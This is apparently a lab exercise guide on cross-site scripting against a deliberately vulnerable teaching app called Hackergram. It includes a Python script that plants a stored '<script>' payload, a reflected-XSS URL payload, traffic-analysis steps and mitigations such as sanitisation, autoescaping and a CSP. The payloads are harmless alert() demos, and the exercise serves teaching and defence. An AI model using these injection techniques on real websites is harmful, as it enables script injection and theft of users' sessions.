# Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a type of injection attack in which malicious scripts are injected into otherwise trusted web pages. When a victim visits an affected page, the injected script is executed in their browser, allowing the attacker to steal session cookies, redirect users, deface pages, or perform actions on behalf of the victim.

XSS attacks are generally categorized into three types: **Stored XSS**, **Reflected XSS**, and **XSS Worm**.

## Stored XSS

In this attack, the attacker writes a post that contains JavaScript code (which gets stored in Hackergram's database). When users see the post the victim-browser executes the code. The procedure is the following:

1.	Create a file with the following Python script at the attacker:

``` py
import requests
import sys

def reset(session):
    session.get(SERVER+"/reset")

def register(session):
    payload = {
        'username': "mallory",
        'name': "Mallory",
        'password': "eve123"
    }
    session.post(SERVER+"/signup", data=payload)

def login(session):
    payload = {
        'username': "mallory",
        'password': "eve123"
    }
    session.post(SERVER+"/login", data=payload)

def exploit(session):
    payload = {
        'content': "<script>alert(\"XSS\")</script>",
    }
    r = session.post(SERVER+"/create_post", data=payload)
    print(r)

if __name__ == '__main__':
    host = '192.168.0.100' if len(sys.argv) < 2 else sys.argv[1]
    port = '80' if len(sys.argv) < 3 else sys.argv[2]
    SERVER = "http://" + host + ":" + port
    print(SERVER)
    with requests.session() as s:
        reset(s)
        register(s)
        login(s)
        exploit(s)
```

The script first makes a request to the ```/reset``` endpoint to force a clean state on Hackergram and then registers and logs in the ```@mallory``` user. Lastly, it makes a request to the ```/create_post``` endpoint, creating a new post with the content: ```<script>alert("XSS")</script>```. This post is going to be stored in Hackergram's database.

2.	Install a Wireshark probe at the Hackergram interface.
3.	Run the script at the attacker.
4.	Login to Hackergram (e.g., as ```mr_robot```) and check that the victim-browser runs the JavaScript code when visiting either Mallory's profile page or Hackergram's homepage. In this case, a pop-up box with the message ```XSS``` must be displayed.
5.	Analyze the traffic exchanged by Hackergram using an ```http``` filter. Identify the HTTP message that injects the JavaScript code in Hackergram and the one that transfers it to the victim-browser.

!!! note "Additional exercise"

    The "/settings" endpoint is also vulnerable to this attack type. Find a way of using the photo field to attack this endpoint.

## Reflected XSS

In this attack, the attacker tricks the victim into clicking a malicious link which results in a JavaScript code being executed in the victim-browser, hence the name reflected XSS.

The vulnerable endpoint that will be exploited is ```/users```, which allows searching for users by providing a search string. The string is passed to Hackergram as an argument (called ```search```) of a GET Request. The procedure is the following:

1.	Install a Wireshark probe at the Hackergram interface.
2.	In the victim-browser enter:
```http://192.168.0.100/users?search=<script>alert%28"XSS"%29<%2Fscript>```
Note that ```%28``` and ```%29``` encode the ```(``` and ```)``` characters, and ```%2F``` encode the ```/``` character.
3.	Check that a pop-up box with the message ```XSS``` is displayed.
4.	Analyze the traffic exchanged by Hackergram using an ```HTTP``` filter. Identify the ```HTTP``` message that sends the JavaScript code to Hackergram and the one where it is reflected to the victim-browser.

!!! note "Additional exercises"

    1. Hackergram has another endpoint vulnerable to this attack. Discover it and perform the attack.
    2. Using the bleach library, sanitize the ```/users``` endpoint so that the attack is no longer possible.

## XSS Worm

## Countermeasures

Effective prevention of XSS attacks involves a multi-layer defense strategy. In particular, it is essential to combine input sanitization, output encoding and the enforcement of a [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP).

### Stored XSS Mitigation

For mitigating stored XSS, the use of html-sanitizer, a maintained allowlist-based HTML sanitizing tool, is recommended. This library should be applied to all user-supplied input prior to rendering or storage. For example, the original code handling the username field in the settings page:

```python
new_name = request.form['name']
```

Should be replaced with the sanitized version:

```python
cleaned_new_name = bleach.clean(request.form['name'])
```

### Reflected XSS Mitigation

To mitigate reflected XSS, all Jinja2 templates must avoid disabling automatic HTML escaping. This can be achieved by removing directives such as `{% autoescape false %}` and `{% endautoescape %}`, which would otherwise allow raw user input to be rendered unescaped.

### Content Security Policy

In addition to sanitization and encoding, the implementation of a strict CSP is advised to further reduce the risk of script execution in the event of injection. Specifically, inline JavaScript should be disallowed via the following directive, which can be added to the base.html file:

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'none'; object-src 'none';">
```
